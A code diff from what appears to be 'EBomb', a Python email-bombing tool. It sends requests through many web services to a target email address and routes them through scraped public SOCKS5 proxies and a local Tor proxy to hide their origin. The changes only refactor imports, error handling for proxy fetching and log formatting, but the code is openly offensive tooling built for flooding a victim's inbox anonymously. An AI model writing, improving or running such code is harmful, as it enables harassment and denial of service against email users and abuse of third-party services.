@@ -4,14 +4,13 @@ import atexit
 import multiprocessing
 import reprlib
 import shutil
-import sys
 from multiprocessing.pool import ThreadPool
 from urllib.error import URLError
 
 import EasyProxies
-import httpx
-import spys.me
+from httpx import HTTPError
 from rich.console import Console
+from spys.me import Getters
 
 from EBomb.services import *
 
@@ -107,16 +106,15 @@ class EBomb:
     @property
     def _socks5_proxies(self) -> set[str]:
         try:
-            return {'localhost:9050',
+            return {'localhost:9050',  # tor socks proxy
                     *(EasyProxies.Proxies.get(format='txt', type='socks5', uptime=100)
                       or EasyProxies.Proxies.get(format='txt', type='socks5'))}
         except (URLError, TimeoutError):
-            pass
-        try:
-            return {'localhost:9050', *(str(i) for i in spys.me.Getters.get_socks5_proxies())}
-        except Exception as e:
-            self.console.log('Getting proxies error:', e)
-            sys.exit(1)
+            try:
+                return {'localhost:9050', *(str(i) for i in Getters.get_socks5_proxies())}
+            except Exception:
+                self.console.log('[red]Error getting proxy.[/]')
+                raise
 
     @property
     def working_proxy(self):
@@ -141,7 +139,7 @@ class EBomb:
         try:
             resp = service.request(email, proxies=_proxy)
             code = resp.status_code
-        except httpx.HTTPError as Error:
+        except HTTPError as Error:
             _markup.response = 'i red'
 
             self._REPR.maxother = self._max_other
@@ -180,10 +178,10 @@ class EBomb:
                 proxies.remove(_proxy)
         self.console.log(
             '[white]'
-            f'[{_markup.service}]{service.netloc:^{self._max_netloc_len}}[/{_markup.service}] '
-            f'/ [{_markup.method}]{service.method:<4}[/{_markup.method}] '
-            f'| [blue]{email:^{self._max_email_len}}[/blue]'
-            f'{f" | [{_markup.proxy}]{str(_proxy):^22}[/{_markup.proxy}]" if _proxy else ""} '
-            f'| [{_markup.response}]{resp}[/{_markup.response}]'
-            '[/white]'
+            f'[{_markup.service}]{service.netloc:^{self._max_netloc_len}}[/] '
+            f'/ [{_markup.method}]{service.method:<4}[/] '
+            f'| [blue]{email:^{self._max_email_len}}[/]'
+            f'{f" | [{_markup.proxy}]{_proxy!s:^22}[/]" if _proxy else ""} '
+            f'| [{_markup.response}]{resp}[/]'
+            '[/]'
         )
